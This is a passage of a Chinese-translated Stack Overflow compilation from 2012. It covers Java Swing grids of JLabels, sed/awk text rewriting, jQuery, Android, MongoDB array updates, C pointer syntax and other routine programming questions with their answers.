    boardLabels[1] = pieces[0];

    boardPanel.add(boardLabels[0]);
    boardPanel.add(boardLabels[1]);
}

public static void main(String[] args) {
    MainFrame frame = new MainFrame();
    frame.setVisible(true);
    frame.setSize(600, 600);
    frame.setLocationRelativeTo(null);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
} 
```

这有效

```
 boardLabels[0] = new JLabel(pieces[1]);
    boardLabels[1] = new JLabel(pieces[1]); 
```

使用 ImageIcons 时，但我想避免这种情况，因为要更新板，我必须删除然后重新加载 JLabels。我宁愿只更新已经加载的标签。

***编辑*** 我以前试过这个，但它抛出一个空指针异常......

```
 boardLabels[0].setIcon(pieces[1]);
    boardLabels[1].setIcon(pieces[1]);

    boardPanel.add(boardLabels[0]);
    boardPanel.add(boardLabels[1]); 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-19T08:04:38.277

为了比较，我重新分解了@HFOE 的[示例](https://stackoverflow.com/a/11553472/230513)，以便`Ground implements Icon`索引`values()`. 作为`value`实现细节，`int[][] MAP`可以改为`Ground[][] MAP`.

更新：此变体说明`Ground[][] MAP`并添加了`TexturePaint`.

![在此处输入图像描述](../Images/4d94c9fb98d1981ba2c41dd40107da0f.png)

```
import java.awt.Color;
import java.awt.Component;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GridLayout;
import java.awt.TexturePaint;
import java.awt.geom.Rectangle2D;
import java.awt.image.BufferedImage;
import java.util.Random;
import javax.swing.*;

/** @see https://stackoverflow.com/a/11556441/230513 */
public class GridExample extends JPanel {

    public static final Ground[][] MAP = {
        {Ground.GRASS, Ground.GRASS, Ground.DIRT, Ground.WATER, Ground.WATER},
        {Ground.GRASS, Ground.DIRT, Ground.CITY, Ground.WATER, Ground.WATER},
        {Ground.GRASS, Ground.DIRT, Ground.CITY, Ground.WATER, Ground.WATER},
        {Ground.GRASS, Ground.DIRT, Ground.DIRT, Ground.DIRT, Ground.WATER},
        {Ground.GRASS, Ground.GRASS, Ground.DIRT, Ground.WATER, Ground.WATER},
    };
    private JLabel[][] labelGrid = new JLabel[MAP.length][MAP[0].length];

    public GridExample() {
        setLayout(new GridLayout(MAP.length, MAP[0].length));
        for (int r = 0; r < labelGrid.length; r++) {
            for (int c = 0; c < labelGrid[r].length; c++) {
                labelGrid[r][c] = new JLabel();
                labelGrid[r][c].setIcon(MAP[r][c]);
                add(labelGrid[r][c]);
            }
        }
    }

    private static void createAndShowGui() {
        GridExample mainPanel = new GridExample();
        JFrame frame = new JFrame("GridExample");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.add(mainPanel);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {
                createAndShowGui();
            }
        });
    }
}

enum Ground implements Icon {

    DIRT(new Color(205, 133, 63)), GRASS(new Color(0, 107, 60)),
    WATER(new Color(29, 172, 214)), CITY(Color.lightGray);
    private static final int SIZE = 42;
    private Random random = new Random();
    private TexturePaint paint;

    private Ground(Color color) {
        this.paint = initPaint(color);
    }

    private TexturePaint initPaint(Color color) {
        BufferedImage image = new BufferedImage(
            SIZE, SIZE, BufferedImage.TYPE_INT_ARGB);
        Rectangle2D.Double rect = new Rectangle2D.Double(0, 0, SIZE, SIZE);
        for (int row = 0; row < SIZE; row++) {
            for (int col = 0; col < SIZE; col++) {
                if (random.nextBoolean()) {
                    image.setRGB(col, row, color.getRGB());
                } else {
                    if (random.nextBoolean()) {
                        image.setRGB(col, row, color.darker().getRGB());
                    } else {
                        image.setRGB(col, row, color.brighter().getRGB());
                    }
                }
            }
        }
        return new TexturePaint(image, rect);
    }

    @Override
    public void paintIcon(Component c, Graphics g, int x, int y) {
        Graphics2D g2d = (Graphics2D) g;
        g2d.setPaint(paint);
        g.fillRect(0, 0, SIZE, SIZE);
    }

    @Override
    public int getIconWidth() {
        return SIZE;
    }

    @Override
    public int getIconHeight() {
        return SIZE;
    }
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-19T03:24:54.637

不要这样做，因为您不能将同一个组件多次添加到可视化容器中。最好使用多个 JLabel 但让它们使用相同的***ImageIcon***。ImageIcons 可以轻松地多次使用：

```
public MainFrame() {
    pieceIcon[0] = new ImageIcon(System.getProperty("user.dir") + 
        "/images/piece1.png");
    pieceIcon[1] = new ImageIcon(System.getProperty("user.dir") + 
        "/images/piece2.png");

    this.add(boardPanel);
    displayGUIboard();
}

public void displayGUIboard() {
    boardPanel.add(new JLabel(pieceIcon[0]);
    boardPanel.add(new JLabel(pieceIcon[0]);
} 
```

顺便说一句：请注意，您的变量*都不*应该是静态的。

**编辑：**关于您最近的编辑：

> 这有效

```
boardLabels[0] = new JLabel(pieces[1]);
boardLabels[1] = new JLabel(pieces[1]); 
```

> 使用 ImageIcons 时，但我想避免这种情况，因为要更新板，我必须删除然后重新加载 JLabels。我宁愿只更新已经加载的标签。”

**解决方案**
不，您根本不必更改 JLabels。`setIcon(...)`将您的 JLabel 保留在它们所在的位置，但只需使用 JLabel方法交换它们保存的图标。

**编辑**
另外，不要将变量与对象混淆。即使您创建了一堆 JLabel 变量，如果它们都引用同一个 JLabel 对象，您仍然不能将*JLabel 对象*多次添加到容器中。

**编辑** 你状态：

> 该代码是游戏显示功能的一部分。一个整数数组将代表被解释的棋盘（但不是在上面的代码中），正确的 Jlabel 图像将被放置到 gridlayout 面板中以显示棋盘的 gui。我已经让显示代码正常工作，但是在我当前的版本中，它从板上删除了 jlabels，然后创建了新的 JLabels(piece...)...但我更希望它从整数数组中更新自身而不是删除标签，读取数组，然后重新创建标签。

所以创建一个使用 GridLayout 的 JPanel 并用不变的 JLabels 填充它。然后只需根据 int 数组保存的值更改 JLabels 保存的图标。您可以创建一种方法来简化和自动化此过程。

**编辑**关于：

> 编辑我以前试过这个，但它抛出了一个空指针异常。

然后像解决任何 NPE 一样解决这个问题。找出哪一行抛出了NPE，检查该行的变量，至少有一个为null，然后修复它，以便在尝试使用它之前初始化变量。

**编辑**
例如：

```
import java.awt.Color;
import java.awt.Graphics;
import java.awt.GridLayout;
import java.awt.image.BufferedImage;

import javax.swing.*;

@SuppressWarnings("serial")
public class GridExample extends JPanel {
   public static final int[][] MAP = {
      {1, 0, 0, 2, 2, 2, 2, 2, 2, 2, 2},
      {1, 1, 0, 0, 2, 2, 2, 2, 2, 2, 2},
      {1, 1, 1, 0, 2, 2, 2, 2, 2, 2, 2},
      {1, 1, 1, 0, 0, 2, 2, 2, 2, 2, 2},
      {1, 1, 1, 1, 0, 2, 2, 2, 2, 2, 2},
      {1, 1, 1, 0, 0, 0, 2, 2, 2, 2, 2},
      {1, 1, 0, 0, 0, 2, 2, 2, 2, 2, 2},
      {1, 1, 1, 0, 0, 0, 2, 2, 2, 2, 2},
      {1, 1, 1, 1, 1, 0, 0, 0, 0, 2, 2},
      {1, 1, 1, 1, 1, 0, 0, 0, 2, 2, 2},
      {1, 1, 1, 1, 1, 1, 0, 0, 0, 2, 2}
   };

   public static final Color[] COLORS = {};
   private JLabel[][] labelGrid = new JLabel[MAP.length][MAP[0].length];

   public GridExample() {
      setLayout(new GridLayout(MAP.length, MAP[0].length));
      for (int r = 0; r < labelGrid.length; r++) {
         for (int c = 0; c < labelGrid[r].length; c++) {
            labelGrid[r][c] = new JLabel();
            labelGrid[r][c].setIcon(Ground.getGround(MAP[r][c]).getIcon());
            add(labelGrid[r][c]);            
         }
      }
   }

   private static void createAndShowGui() {
      GridExample mainPanel = new GridExample();

      JFrame frame = new JFrame("GridExample");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(mainPanel);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
}

enum Ground {
   DIRT(0, new Color(205,133, 63)), GRASS(1, new Color(0, 107, 60)), 
   WATER(2, new Color(29, 172, 214));
   private int value;
   private Color color;
   private Icon icon;

   private Ground(int value, Color color) {
      this.value = value;
      this.color = color;

      icon = createIcon(color);
   }

   private Icon createIcon(Color color) {
      int width = 24; // how to use const in enum? 
      BufferedImage img = new BufferedImage(width, width, BufferedImage.TYPE_INT_ARGB);
      Graphics g = img.getGraphics();
      g.setColor(color);
      g.fillRect(0, 0, width, width);
      g.dispose();
      return new ImageIcon(img);
   }

   public int getValue() {
      return value;
   }

   public Color getColor() {
      return color;
   }

   public Icon getIcon() {
      return icon;
   }

   public static Ground getGround(int value) {
      for (Ground ground : Ground.values()) {
         if (ground.getValue() == value) {
            return ground;
         }
      }
      return null;
   }

} 
```

其中显示了一个 GUI 网格：
![在此处输入图像描述](../Images/cdbc4cf537a341aceba352784be8ca11.png)

# iphone - 如何在提交应用程序时添加其他信息

> ID：11553466
> 
> 赞同：0
> 
> 时间：2012-07-19T03:23:19.550
> 
> 标签：iphone, ios, ipad

现在，我将提交我的应用程序以供批准。问题是，第一次登录应用程序时，您必须输入我提供的验证码（通过电子邮件或口头给我的目标用户）。那么我怎样才能给出批准的代码。

可能我可以以编程方式设置默认验证码，但是当应用程序被批准时，我必须更新应用程序以禁用默认验证码，这会导致另一个批准过程。

那么，有人可以给我一些建议来解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:30:35.003

当您在 iTunesConnect 中准备提交您的应用程序时，会有一个评论备注框（[来源](https://itunesconnect.apple.com/docs/iTunesConnect_DeveloperGuide.pdf)，第 49 页），您可以在其中放置一个验证码供评论者使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T05:54:08.620

iTunes Connect 为查看笔记提供了一个区域。应用程序测试人员将查看此内容并在审核期间使用它。

只需将验证码和任何其他信息放在该区域内即可。他们会读的。

# vim - 如何在不编程的情况下根据特定模式替换文件中的子字符串

> ID：11553467
> 
> 赞同：1
> 
> 时间：2012-07-19T03:23:34.113
> 
> 标签：vim, sed, awk

假设我有一个文件：

它的格式应该是：数字，string1，[string2]，....

这里string1不应该包含','，因为我们使用','来分隔每一列但是由于某种原因，string1现在包含一些','，所以我们需要用其他符号替换它，例如'-'

```
1,aaa,bbb,ccc,[x,y,z],eee,fff,ggg
2,q,w,[x],f,g
3,z,[y],g,h
4,zzz,xxx,ccc,vvv,[z],g,h
.... 
```

应修改为：

```
1,aaa-bbb-ccc,[x,y,z],eee,fff,ggg
2,q-w,[x],f,g
3,z,[y],g,h
4,zzz-xxx-ccc-vvv,[z],g,h
.... 
```

什么是不编程的最佳方法，我的意思是我们只使用 awk、sed、vim 而不是 shell 编程、python、c++ 等

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:35:53.750

有点长，但你可以`sed`这样使用：

```
sed ':loop; s/\([0-9]\+,.*\)\([^,]*\),\([^,]*\)\(.*,\[\)/\1\2-\3\4/; t loop' \
     input_file 
```

略短的一个：

```
sed ':loop; s/\([0-9]*,[^\[,]*\),\([^\[,]*,\[\)/\1-\2/; t loop' input_file 
```

第二个说明：

```
loop while there are matches                   # :loop;
  1) find numbers followed by a comma,         #   \([0-9]*,
       followed by anything not comma or '[',  #   [^\[,]*\)
  2) find comma                                #   ,
  3) find anything not ',' or '['              #   \([^\[,]*
  4) followed by a ',' and '['                 #   ,\[\)/
  5) replace the whole thing with
       match of step 1 and '-' and matches 
       from steps 3-4                          #   /\1-\2/;
end loop

                                   # t loop 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T03:47:13.780

```
$ awk -F, 'BEGIN{OFS=FS} {two=$0;sub($1 FS,"",two);sub(/,[[].*/,"",two);gsub(/,/,"-",two); rest=$0;sub(/^[^[]*/,"",rest); print $1,two,rest}' input.txt 
1,aaa-bbb-ccc,[x,y,z],eee,fff,ggg
2,q-w,[x],f,g
3,z,[y],g,h
4,zzz-xxx-ccc-vvv,[z],g,h
$ 
```

让我们分解 awk 脚本以便于注释。

```
$ awk -F, '
  BEGIN { OFS=FS }
  {
    two=$0;                # Second field is based on the line...
    sub($1 FS,"",two);     # Remove the first field,
    sub(/,[[].*/,"",two);  # Remove everything from the [ onwards,
    gsub(/,/,"-",two);     # Replace commas in whatever remains.

    rest=$0;               # Last part of the line, after "two"
    sub(/^[^[]*/,"",rest); # Strip everything up to the [

    print $1,two,rest;     # Print it.
  }
' input.txt 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T06:11:38.593

这可能对您有用（GNU sed）：

```
sed -e 's/,\[/\n&/;h;s/\n.*//;s/,/-/2g;G;s/\n.*\n//' file 
```

# java - toBinaryString 类型错误

> ID：11553468
> 
> 赞同：1
> 
> 时间：2012-07-19T03:23:49.610
> 
> 标签：java, string, compiler-errors, int

编译以下内容时出现不兼容类型错误：

```
public class E10_Bitwise {
    public static void main(String[] args) {
        Bit b = new Bit();
        int x = 87;
        int y = 170;
        x = Integer.toBinaryString(x);
        y = Integer.toBinaryString(y);
        b.combiner(x, y);
    }
} 
```

出于某种原因，它认为括号内的 x 和 y 是字符串。我是在犯错误还是这里发生了其他事情？

```
E10_Bitwise.java:22 error: incompatible types
                 x = Integer.toBinaryString(x)
                                           ^
required: int
found: string 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:29:03.960

[toBinaryString()](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Integer.html#toBinaryString%28int%29)的返回类型是字符串。

尝试，

```
String xStr=Integer.toBinaryString(x); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T03:28:56.190

您正在尝试将 type 的返回值分配给 type`String`的变量`int`。这行不通。

您需要分配 的返回值`toBinaryString`，如下所示：

```
String xStr = Integer.toBinaryString(x);
String yStr = Integer.toBinaryString(y);
b.combiner(xStr, yStr); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T03:29:15.507

您正在尝试分配一个`String`(Integer.toBinaryString()) 返回给`int x`.

您将需要一个 String 变量来将其分配给它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-19T03:30:21.277

我根本不了解Java，但看起来您正在尝试将**字符串**（来自 Integer.toBinaryString() 调用的结果）分配给**int** (x, y)。

我的猜测是 toBinaryString() 创建一个整数的二进制字符串（例如“010101110”）表示。

# jquery - 延迟加载 Twitter 工具提示（或任何其他 JavaScript）

> ID：11553469
> 
> 赞同：0
> 
> 时间：2012-07-19T03:24:18.287
> 
> 标签：jquery, twitter-bootstrap

我有这个 Twitter Bootstrap 的工具提示工作：

```
$("[rel=popover]")
    .popover()
    .click(function(e) {
        e.preventDefault()
    }); 
```

这适用于 HTML。但是，我有生成一些代码的 JavaScript。我如何使用`jQuery.on()`或`delegate()`让它与延迟的 JavaScript 一起使用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:43:31.920

尝试以下操作：

```
$('body').on('mouseover', "[rel=popover]", function() {
   $(this).popover()
}) 
```

# java - 发送 Android SMS 卡在状态发送中

> ID：11553470
> 
> 赞同：0
> 
> 时间：2012-07-19T03:24:28.047
> 
> 标签：java, android, sms, android-pendingintent

我正在使用内容解析器在 Android 中发送短信：

```
ContentValues values = new ContentValues(6);
... 
values.put("status", 0);

...
Uri uri = context.getContentResolver().insert(Uri.parse("content://sms/outbox"), values); 
```

这很有效，因为它显示在短信应用程序中。它成功发送**并**收到成功的发送报告作为回报，但它仍处于 Sending 状态。

知道为什么或有关如何更新的一些指示吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-26T03:54:01.723

我使用此内容解析器查询了发件箱消息：

```
Cursor outboxCursor = context.getContentResolver().query(Uri.parse("content://sms/outbox"), null, null, null, null); 
```

然后删除它们：

```
Uri deleteURI = Uri.parse("content://sms/outbox/");
context.getContentResolver().delete(deleteURI, null, null); 
```

# jinja2 - 转义指定的 CSS 类

> ID：11553471
> 
> 赞同：0
> 
> 时间：2012-07-19T03:24:52.120
> 
> 标签：jinja2

我试图想出一种方法来使用 jinja 来逃避某个 css 类。例子：

```
<div class="code"> <center> ... more example html code ... </center> </div> 
```

在哪里

```
<center> 
```

标签明显写在帖子中。同样，我只希望代码类逃脱。有什么提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T20:47:42.680

如果您只想转义您的类代码，则需要将其作为单独的变量传递，如下所示：

```
{{ classcode|e }}{{ Your other unescaped code here }} 
```

我希望这可以帮助你。

# android - Ninepatch 图形显示中的错误

> ID：11553475
> 
> 赞同：0
> 
> 时间：2012-07-19T03:25:10.660
> 
> 标签：android, nine-patch

我尝试使用九个补丁作为布局的背景。但是，显示了九个补丁中的一些指标。请参阅此链接-> [http://dl.dropbox.com/u/78582670/NinePatchError.png](http://dl.dropbox.com/u/78582670/NinePatchError.png)

怎么去掉指标？？

我的嵌套布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:background="#FFFEFEFE"
android:orientation="horizontal" >

<TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="0.5"
    android:text="@string/test1" />

<FrameLayout
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:background="@drawable/menu_bg2">

</FrameLayout> 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T03:32:42.943

你看过九个补丁图像本身吗？您应该可以使用任何图形编辑应用程序打开它。我的感觉是 9 补丁图像实际上是这里的问题，而不是你的布局。要解决此问题，如果您确认图像包含错误，只需在 9patch 工具中重新运行切片即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:53:06.790

您的问题是您没有在 9 补丁工具中制作 9 补丁。出于某种原因，当您应该在左侧有一条连续的黑线而在顶部有另一条连续的黑线时，由于某种原因，您在左侧有两条黑线。

另外，我不确定您为什么要将此特定图像用作 9 补丁。这没有道理。

[http://developer.android.com/tools/help/draw9patch.html](http://developer.android.com/tools/help/draw9patch.html)本文档解释了 9 个补丁的用途以及如何正确设置它们。

# javascript - 我需要在悬停时使用选择器和在悬停外设置的变量来查找特定链接

> ID：11553477
> 
> 赞同：1
> 
> 时间：2012-07-19T03:25:23.517
> 
> 标签：javascript, jquery, html, css

这对我来说很难解释，所以我会尽力而为。这是这段代码：

```
$('#navibar a').hover(function(){
    var position = $(this).position(); 
    var width = $(this).width();
    $('#underliner').css({'width': '' + width + '','left': position.left});
    //$('#underliner').show("slide", { direction: "left" }, 100);
    $('#underliner').stop().animate({opacity: 1}, 30).show();
}, function () {
    var homePos = $(this).find(attr(activePageHref)).position();
    var homeWidth = $(this).find(attr(activePageHref)).width();
    //$('#underliner').css({'width': '' + homeWidth + '','left': homePos.left});
    //$('#underliner').show("slide", { direction: "left" }, 100);
    //$('#underliner').stop().animate({opacity: 1}, 30).show();
    alert(activePageHref);
}); 
```

activePageHref 在此之外设置为已单击的页面。在警报中，它显示正确（例如，让我们说它的值是“home”。我需要以某种方式将#underliner.css 位置和宽度设置为悬停时选择的导航中的页面链接，所以有没有办法“找到”其他“a”并使用它们？希望在代码中我想要做的事情很明显。这是我的标记：

```
<ul id="navibar">
            <li><a href="home">Home</a></li>
            <li><a href="products">Products</a></li>
            <li><a href="games">Games</a></li>
            <li><a href="store">Store</a></li>
            <li><a href="support">Support</a></li>
            <li><a href="community">Community</a></li>
        </ul> 
```

另外，我知道第一段代码是大错特错，这只是我在决定在这里发帖之前出于愤怒和绝望而做的最后一件事。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:32:29.357

使用属性选择器找到 href 为 activePageHref 的链接

```
$('#navibar a').hover(function(){
    var position = $(this).position(); 
    var width = $(this).width();
    $('#underliner').css({'width': '' + width + '','left': position.left});
    //$('#underliner').show("slide", { direction: "left" }, 100);
    $('#underliner').stop().animate({opacity: 1}, 30).show();
}, function () {
    var homePos = $(this).parents('#navibar').find('a[href="'+activePageHref+'"]').position();
    var homeWidth = $(this).parents('#navibar').find('a[href="'+activePageHref+'"]').width();
    //$('#underliner').css({'width': '' + homeWidth + '','left': homePos.left});
    //$('#underliner').show("slide", { direction: "left" }, 100);
    //$('#underliner').stop().animate({opacity: 1}, 30).show();
    alert(activePageHref);
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T03:43:48.457

首先，您可以通过类似的方式选择“a” `event.target`；
其次，你添加`activeClass`到目标；
第三，通过选择器获取其他a，比如`$("ul#navibar li a:not(.activeClass)")` Here会得到一个数组中那些不活跃的a，可以通过`$.each`

愿它对你有所帮助。

# oracle - 有条件地更改 oracle apex 中按钮的图像

> ID：11553479
> 
> 赞同：1
> 
> 时间：2012-07-19T03:25:55.587
> 
> 标签：oracle, oracle11g, oracle-apex

如何有条件地更改 oracle apex 中按钮的图像？

想象有两个图像`A.png`和`B.png`。我有一个 sql 查询，如果该查询返回至少一行，则按钮的图像应该是`A.png`. 否则按钮的图像应该是`B.png`.

我怎么能这样做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:37:45.430

您可以在 HTML 中有一个隐藏字段，并使用 SQL 查询返回的行数填充它`SELECT COUNT(*) FROM TABLE;`

用于`APEX_ITEM.HIDDEN()`创建隐藏字段，隐藏项名称（`id`对于 HTML）可以是“abcID”。隐藏字段 HTML（在 HTML 中的某处`<body>`）将类似于 -

```
<input type=hidden id="abcId" name="abcName"/> 
```

然后，您可以添加此 javascript 来更改按钮图像。您必须`onload`在 HTML 中包含一个事件`<body>`才能调用函数。

```
<html>
<body onload=changeImage()>
....
....
<script language="javascript">
    function changeImage()
    {
      if (document.getElementById("abcId").value) > 0){
          document.getElementById("ButtonID").src ="/path/to/A.png";
      else{
          document.getElementById("ButtonID").src ="/path/to/B.png";
      }
    }
</script>
</body>
</html> 
```

# c# - 更新 BsonDocument 中数组内的元素

> ID：11553481
> 
> 赞同：0
> 
> 时间：2012-07-19T03:26:05.333
> 
> 标签：c#, mongodb, mongodb-.net-driver

我有一个像这样的“收款人”BsonDocument：

```
{
  "Token" : "0b21ae960f25c6357286ce6c206bdef2",
  "LastAccessed" : ISODate("2012-07-11T02:14:59.94Z"),
  "Firstname" : "John",
  "Lastname" : "Smith",
  "PayrollInfo" : [{
      "Tag" : "EARNINGS",
      "Value" : "744.11",
    }, {
      "Tag" : "DEDUCTIONS",
      "Value" : "70.01",
    }],
  },
  "Status" : "1",
  "_id" : ObjectId("4fc263158db2b88f762f1aa5")
} 
```

我根据收款人 _id 检索此文档。

```
var collection = database.GetCollection("Payee");
var query = Query.EQ("_id", _id);
var bDoc = collection.FindOne(query); 
```

然后，在不同的时间我需要更新 PayrollInfo 数组中的特定对象。因此，我在数组中搜索具有适当“标签”的对象，并将“值”更新到数据库中。我使用以下逻辑来做到这一点：

```
var bsonPayrollInfo = bDoc["PayrollInfo", null];
if (bsonPayrollInfo != null)
{
    var ArrayOfPayrollInfoObjects = bsonPayrollInfo.AsBsonArray;
    for (int i = 0; i < ArrayOfPayrollInfoObjects.Count; i++)
    {
        var bInnerDoc = ArrayOfPayrollInfoObjects[i].AsBsonDocument;
        if (bInnerDoc != null)
        {
            if (bInnerDoc["Tag"] == "EARNINGS")
            {
                //update here
                var update = Update
                    .Set("PayrollInfo."+ i.ToString() + ".Value", 744.11)
                collection.FindAndModify(query, null, update);
                bUpdateData = true;
                break;
            }
        }
    }
}

if (!bUpdateData)
{
    //Use Update.Push.  This works fine and is not relevant to the question.
} 
```

所有这些代码都可以正常工作，但我认为我在实现结果方面很麻烦。有没有更简洁的方法来做到这一点？本质上，我试图找到一种更好的方法来更新 BsonDocument 中数组内的对象。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:46:59.880

Mongo 有一个位置运算符，可以让您对数组中的匹配值进行操作。语法是：`field1.$.field2`

这是一个如何在 Mongo shell 中使用它的示例：

```
db.dots.insert({tags: [{name: "beer", count: 2}, {name: "nuts", count: 3}]})
db.dots.update({"tags.name": "beer"}, {$inc: {"tags.$.count" : 1}})
result = db.dots.findOne()
{ "_id" : ObjectId("50078284ea80325278ff0c63"), "tags" : [ { "name" : "beer", "count" : 3 }, { "name" : "nuts", "count" : 3 } ] } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T22:00:50.923

把我的答案放在这里，以防它帮助你。根据@MrKurt 的回答（谢谢！），这是我为重新编写代码所做的工作。

```
var collection = database.GetCollection("Payee");
var query = Query.EQ("_id", _id);

if (collection.Count(query) > 0)
{
    //Found the Payee.  Let's save his/her Tag for EARNINGS
    UpdateBuilder update = null;

    //Check if this Payee already has any EARNINGS Info saved.
    //If so, we need to update that.
    query = Query.And(query,
        Query.EQ("PayrollInfo.Tag", "EARNINGS"));

    //Update will be written based on whether we find the Tag:EARNINGS element in the PayrollInfo array
    if (collection.Count(query) > 0)
    {
        //There is already an element in the PayrollInfo for EARNINGS
        //Just update that element
        update = Update
            .Set("PayrollInfo.$.Value", "744.11");
    }
    else
    {
        //This user does not have any prior EARNINGS data.  Add it to the user record
        query = Query.EQ("_id", _id);
        //Add a new element in the Array for PayrollInfo to store the EARNINGS data
        update = Update.Push("PayrollInfo",
                    new BsonDocument {{"Tag", "EARNINGS"}, {"Value", "744.11"}}
                 ); 
    }

    //Run the update
    collection.FindAndModify(query, null, update);
} 
```

它看起来并不比我的原始代码少，但它更直观，而且我学到了很多关于位置运算符的知识！

# c++ - 如何删除最后一个字符

> ID：11553484
> 
> 赞同：-2
> 
> 时间：2012-07-19T03:26:25.943
> 
> 标签：c++, string

以下函数将生成一个`'\x'`介于两者之间的字符串，

```
string GetHexEncode(string hexstring){
    string swap = "\\x";
    string h = "\\x";
    int si = hexstring.length();
    for (int i=0; i<hexstring.length(); i++)
    {
        if (i%2==0){
            swap+=hexstring.at(i);
        }
        else
        {
            swap+=hexstring.at(i)+h;
        }
    }
    return swap;
} 
```

有时，程序会输出以下内容：

```
\x45\x39\xD3\x5B\x4F\xEA\x6F\x3C\xBC\x1B\xA0\xF4\xE7\x41\xE5\x8
\x45\x39\xD3\x5B\x4F\xEA\x6F\x3C\xBC\x1B\xA0\xF4\xE7\x41\xE5\x 
```

如果发生这种情况，有什么方法可以将最后一部分更改为：

```
\x45\x39\xD3\x5B\x4F\xEA\x6F\x3C\xBC\x1B\xA0\xF4\xE7\x41\xE5 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:49:31.150

从一个空开始`swap`并附加`h`+ 数字而不是`\x`在末尾附加一个。

此外，您应该在开始结果之前预先分配足够的空间，`swap`因为您之前知道结果的最终长度。这将节省字符串的重新分配。

# mysql - Mysql 游戏剩余时间的数据类型

> ID：11553489
> 
> 赞同：1
> 
> 时间：2012-07-19T03:28:31.963
> 
> 标签：mysql

我正在开发一个跟踪高中体育运动成绩的应用程序。

它将允许用户提交正在进行的游戏分数。现在我有一个名为分数的数据库表。

但是当谈到以分钟和秒为单位表示游戏中剩余的时间时，我被困住了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:31:22.303

您可以使用[TIME 类型](http://dev.mysql.com/doc/refman/5.5/en/time.html)：

> MySQL 以“HH:MM:SS”格式（或“HHH:MM:SS”格式用于大小时值）检索和显示 TIME 值。TIME 值的范围可以从“-838:59:59”到“838:59:59”。小时部分可能会很大，因为 TIME 类型不仅可以用于表示一天中的某个时间（必须小于 24 小时），还可以用于表示经过的时间或两个事件之间的时间间隔（可能远大于24 小时，甚至是负数）。

# c - 为什么类型在 C 中的这个值交换代码中不匹配？

> ID：11553491
> 
> 赞同：0
> 
> 时间：2012-07-19T03:28:38.513
> 
> 标签：c, pointers

```
void swap(char *a,char *b){
  char t;
  t = *a;
  *a = *b;
  *b = t;
}
int main(void){
  char  a = '1';
  char b = '2';

  swap(&a,&b);
  printf("The value is %c and %c respectively\n",a,b);
  return 0;
} 
```

在上面的代码中，有一个地方让我感到困惑

我认为 if`a`是一个指针，并且`*a`是它指向的值

```
int *ptr, a = 1;

ptr = &a;
printf("The value of *ptr should be a: %d\n",*ptr);
printf("The value of *a should be an hex address: %p\n",ptr); 
```

所以在`swap(char *a, char *b)`函数中，它的值不是指针（*a不是a），

`swap(&a, &b)` 但它实际上将指针值作为参数传递给它，并且代码有效。任何人都可以向我解释吗？（我认为`swap(char *a){...}`部分声明并不意味着它需要 *a 才能传入，它意味着声明一个指针 value `a`，而不是 a 指向`*a`其他地方的值意味着）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:34:00.117

你的功能

```
swap(char *a, char *b) 
```

接受两个参数，它们的类型都是`char *`. 从字面上看，这意味着它们指向内存中某处的一个字符。

当您取消引用指针时

```
t = *a; 
```

您是在说“抓住任何`a`指向的东西并将其放入`t`.

也许混淆是因为这`*`意味着两个相关但不同的事物。在这种情况下`char *`，它定义了一个*类型*，特别是一个指向内存中某个地方的字符的类型。在这种情况下`*a`，意思是“看看*a*`*`指向的字符，让我知道它是什么”。

 ** * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T03:34:34.767

`*`令人困惑，因为它意味着两个不同但密切相关的事物。在变量*声明*中，`*`表示“指针”。在*表达式*中，`*`表示“取消引用指针”。

它旨在成为一个有用的助记符：如果你`char *a`的代码中有它意味着它`*a`是一个`char`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T03:33:42.803

在`main`：

*   `a`是一个`char`
*   `&a`是指向 char 的指针`a`。

在`swap`：

*   `a`是指向 char 的指针
*   `*a`是 所指向的字符`a`。

